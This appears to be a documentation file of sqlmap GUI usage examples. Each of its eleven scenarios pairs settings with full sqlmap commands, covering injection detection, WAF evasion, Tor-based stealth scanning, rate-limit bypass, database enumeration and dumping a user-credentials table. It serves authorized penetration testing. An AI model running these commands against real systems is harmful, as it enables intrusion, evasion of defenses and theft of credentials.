# Basic Scanning Examples

This document provides examples of basic SQL injection scanning scenarios using the SQLmap GUI, from simple vulnerability detection to comprehensive testing.

## 🎯 Simple Vulnerability Detection

### Example 1: Basic GET Parameter Testing
**Scenario:** Test a product page with ID parameter for SQL injection

**Target Information:**
- URL: `http://example.com/product.php?id=1`
- Method: GET
- Parameter: `id` (numeric)

**GUI Configuration:**
```
Target Tab:
├── URL: http://example.com/product.php?id=1
├── Method: GET (default)
└── Request Data: (leave empty)

Detection Tab:
├── Level: 3 (Balanced detection)
├── Risk: 2 (Moderate payloads)
├── Techniques:
│   ├── Boolean-based Blind: ✓
│   ├── Error-based: ✓
│   └── UNION Query-based: ✓
└── String Match: (leave empty)

General Tab:
├── Batch: ✓ (Never ask for user input)
├── Verbose Level: 2 (Informational)
└── Log File: ./logs/basic_scan.log
```

**Generated Command:**
```bash
sqlmap -u "http://example.com/product.php?id=1" --level=3 --risk=2 --technique=BEU --batch -v 2 --log-file=./logs/basic_scan.log
```

**Expected Output:**
```
[INFO] the back-end DBMS is MySQL
[INFO] fetching database names
[INFO] the SQL injection is located at parameter 'id'
available databases [3]:
[*] information_schema
[*] example_db
[*] mysql
```

### Example 2: POST Form Testing
**Scenario:** Test a login form for SQL injection vulnerabilities

**Target Information:**
- URL: `http://example.com/login.php`
- Method: POST
- Parameters: `username`, `password`

**GUI Configuration:**
```
Target Tab:
├── URL: http://example.com/login.php
├── Method: POST
├── Request Data: username=admin&password=test
└── Content-Type: application/x-www-form-urlencoded

Injection Tab:
├── Testable Parameters: username,password
├── DBMS: (auto-detect)
├── Tamper Scripts: (none)
└── Invalid BigNum: ✓

Detection Tab:
├── Level: 2 (Faster detection)
├── Risk: 1 (Safer payloads)
├── Techniques:
│   ├── Boolean-based Blind: ✓
│   ├── Error-based: ✓
│   └── UNION Query-based: ✓
└── String Match: "Login successful"

Request Tab:
├── Timeout: 30
├── Delay: 0
└── Keep Alive: ✓
```

**Generated Command:**
```bash
sqlmap -u "http://example.com/login.php" --method=POST --data="username=admin&password=test" -p "username,password" --invalid-bignum --level=2 --risk=1 --technique=BEU --string="Login successful" --timeout=30 --keep-alive
```

## 🔍 Intermediate Scanning

### Example 3: Cookie-Based Authentication
**Scenario:** Test an authenticated application using session cookies

**Target Information:**
- URL: `http://example.com/dashboard.php?id=1`
- Authentication: Session cookie

**GUI Configuration:**
```
Target Tab:
├── URL: http://example.com/dashboard.php?id=1
├── Method: GET
├── Cookie: PHPSESSID=abc123def456; auth_token=xyz789
└── User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

Request Tab:
├── Safe URL: http://example.com/keepalive.php
├── Safe POST: refresh_session=1
└── Follow Redirects: ✓

Detection Tab:
├── Level: 4 (Thorough detection)
├── Risk: 2 (Moderate risk)
├── Techniques: BEUST (All except inline)
└── Regex Match: "Welcome.*admin"

Injection Tab:
├── Testable Parameters: id
├── Skip Static: ✓
└── DBMS: MySQL
```

**Generated Command:**
```bash
sqlmap -u "http://example.com/dashboard.php?id=1" --cookie="PHPSESSID=abc123def456; auth_token=xyz789" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" --safe-url="http://example.com/keepalive.php" --safe-post="refresh_session=1" --follow-redirects --level=4 --risk=2 --technique=BEUST --regexp="Welcome.*admin" -p id --skip-static --dbms=mysql
```

### Example 4: JSON API Testing
**Scenario:** Test a REST API endpoint that accepts JSON data

**Target Information:**
- URL: `http://api.example.com/v1/users`
- Method: POST
- Content-Type: application/json

**GUI Configuration:**
```
Target Tab:
├── URL: http://api.example.com/v1/users
├── Method: POST
├── Request Data: {"id": 1, "name": "test"}
├── Content-Type: application/json
└── Header: Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...

Injection Tab:
├── Testable Parameters: id,name
├── Base64 Parameters: (if token is base64)
└── Tamper Scripts: (none)

Detection Tab:
├── Level: 3
├── Risk: 2
├── Techniques: BEU
└── String Match: "success"

Request Tab:
├── Accept: application/json
├── Timeout: 45
└── Ignore Certificate: ✓ (if self-signed)
```

**Generated Command:**
```bash
sqlmap -u "http://api.example.com/v1/users" --method=POST --data="{\"id\": 1, \"name\": \"test\"}" --header="Content-Type: application/json" --header="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..." -p "id,name" --level=3 --risk=2 --technique=BEU --string="success" --accept="application/json" --timeout=45 --ignore-cert
```

## 🛡️ WAF Evasion Basics

### Example 5: Basic WAF Bypass
**Scenario:** Test a protected application with basic WAF filters

**Target Information:**
- URL: `http://example.com/search.php?q=test`
- WAF: Basic SQL injection filters

**GUI Configuration:**
```
Target Tab:
├── URL: http://example.com/search.php?q=test
└── User-Agent: (leave default)

Injection Tab:
├── Testable Parameters: q
├── Tamper Scripts:
│   ├── space2comment
│   └── randomcase
├── Prefix: ' OR
└── Suffix: -- -

Detection Tab:
├── Level: 3
├── Risk: 2
├── Techniques: BT (Boolean + Time-based)
└── Time Delay: 3

Request Tab:
├── Delay: 2
├── Random Agent: ✓
└── Timeout: 60
```

**Generated Command:**
```bash
sqlmap -u "http://example.com/search.php?q=test" -p q --tamper=space2comment,randomcase --prefix="' OR " --suffix=" -- -" --level=3 --risk=2 --technique=BT --time-sec=3 --delay=2 --random-agent --timeout=60
```

## 📊 Database Discovery

### Example 6: Basic Database Enumeration
**Scenario:** Discover database structure and contents

**Target Information:**
- URL: `http://example.com/admin.php?id=1`
- Goal: Enumerate databases, tables, and columns

**GUI Configuration:**
```
Target Tab:
├── URL: http://example.com/admin.php?id=1
└── Cookie: admin_session=authenticated

Enumeration Tab:
├── Enumerate Databases: ✓
├── Enumerate Tables: ✓
├── Enumerate Columns: ✓
├── Enumerate Users: ✓
└── Database: (leave empty for all)

General Tab:
├── Output Directory: ./enumeration_results/
├── CSV Format: ✓
├── Verbose Level: 3
└── Batch: ✓
```

**Generated Command:**
```bash
sqlmap -u "http://example.com/admin.php?id=1" --cookie="admin_session=authenticated" --dbs --tables --columns --users --output-dir=./enumeration_results/ --csv -v 3 --batch
```

### Example 7: Targeted Data Extraction
**Scenario:** Extract specific data from a known table

**Target Information:**
- URL: `http://example.com/user.php?id=1`
- Known: Database `users_db`, Table `user_credentials`

**GUI Configuration:**
```
Target Tab:
├── URL: http://example.com/user.php?id=1
└── Method: GET

Enumeration Tab:
├── Database: users_db
├── Table: user_credentials
├── Columns: username,password,email,last_login
├── Dump Table: ✓
├── Start from Entry: 1
└── Stop at Entry: 100

General Tab:
├── Output Directory: ./data_extract/
├── CSV Format: ✓
└── Verbose Level: 2
```

**Generated Command:**
```bash
sqlmap -u "http://example.com/user.php?id=1" -D users_db -T user_credentials -C username,password,email,last_login --dump --start=1 --stop=100 --output-dir=./data_extract/ --csv -v 2
```

## 🔧 Performance Optimization

### Example 8: Fast Scanning
**Scenario:** Quick vulnerability assessment with speed priority

**GUI Configuration:**
```
Detection Tab:
├── Level: 1 (Fastest)
├── Risk: 1 (Safest)
└── Techniques: E (Error-based only)

Request Tab:
├── Threads: 10 (Maximum)
├── Keep Alive: ✓
├── Null Connection: ✓
└── Timeout: 15

General Tab:
├── Batch: ✓
├── Verbose Level: 1
└── Progress Bar: ✓
```

**Generated Command:**
```bash
sqlmap -u "http://example.com/page.php?id=1" --level=1 --risk=1 --technique=E --threads=10 --keep-alive --null-connection --timeout=15 --batch -v 1
```

### Example 9: Stealth Scanning
**Scenario:** Avoid detection while performing thorough testing

**GUI Configuration:**
```
Detection Tab:
├── Level: 2
├── Risk: 1
└── Techniques: BT (Boolean + Time-based)

Request Tab:
├── Delay: 5 (seconds between requests)
├── Random Agent: ✓
├── Tor: ✓
└── Timeout: 90

Injection Tab:
├── Tamper Scripts: space2comment
└── Skip Static: ✓

General Tab:
├── Verbose Level: 0 (Minimal output)
└── Suppress Output: ✓
```

**Generated Command:**
```bash
sqlmap -u "http://example.com/page.php?id=1" --level=2 --risk=1 --technique=BT --delay=5 --random-agent --tor --timeout=90 --tamper=space2comment --skip-static -v 0
```

## 🐛 Troubleshooting Examples

### Example 10: Handling Slow Responses
**Scenario:** Target has slow response times or timeouts

**GUI Configuration:**
```
Request Tab:
├── Timeout: 120 (2 minutes)
├── Retries: 5
├── Delay: 3
└── Keep Alive: ✓

Detection Tab:
├── Level: 2 (Reduced from default)
├── Risk: 1
└── Techniques: T (Time-based only)

General Tab:
├── Verbose Level: 3
└── Log File: ./logs/troubleshooting.log
```

**Generated Command:**
```bash
sqlmap -u "http://slow-target.com/page.php?id=1" --timeout=120 --retries=5 --delay=3 --keep-alive --level=2 --risk=1 --technique=T -v 3 --log-file=./logs/troubleshooting.log
```

### Example 11: Bypassing Rate Limiting
**Scenario:** Target implements rate limiting or DDoS protection

**GUI Configuration:**
```
Request Tab:
├── Delay: 10 (Long delay)
├── Threads: 1 (Single thread)
├── Random Agent: ✓
├── Tor: ✓
└── Timeout: 60

Injection Tab:
├── Tamper Scripts: randomcase,space2comment
└── Invalid String: ✓

Detection Tab:
├── Level: 3
├── Risk: 2
└── Techniques: BEU
```

**Generated Command:**
```bash
sqlmap -u "http://rate-limited.com/page.php?id=1" --delay=10 --threads=1 --random-agent --tor --timeout=60 --tamper=randomcase,space2comment --invalid-string --level=3 --risk=2 --technique=BEU
```

---

## 📝 Best Practices for Basic Scanning

1. **Start Simple**: Begin with basic detection (Level 2-3, Risk 1-2)
2. **Verify Results**: Always manually verify SQL injection findings
3. **Use Appropriate Delays**: Balance speed with detection avoidance
4. **Log Everything**: Enable logging for troubleshooting and reporting
5. **Test in Stages**: Start with detection, then move to enumeration
6. **Respect Rate Limits**: Use delays to avoid being blocked
7. **Document Findings**: Keep detailed records of all testing activities

## ⚠️ Important Notes

- **Legal Compliance**: Ensure you have explicit permission to test targets
- **System Impact**: SQL injection testing can affect application performance
- **Data Sensitivity**: Be aware of data exposure risks during testing
- **Backup First**: Recommend backing up target systems before testing
- **Time Considerations**: Complex scans can take significant time to complete

For more advanced examples, see the other files in this examples directory.</content>
<parameter name="filePath">/home/devil/Desktop/SQLmap-GUI-Advanced-SQL-Injection-Testing-Interface/docs/examples/basic_scanning.md
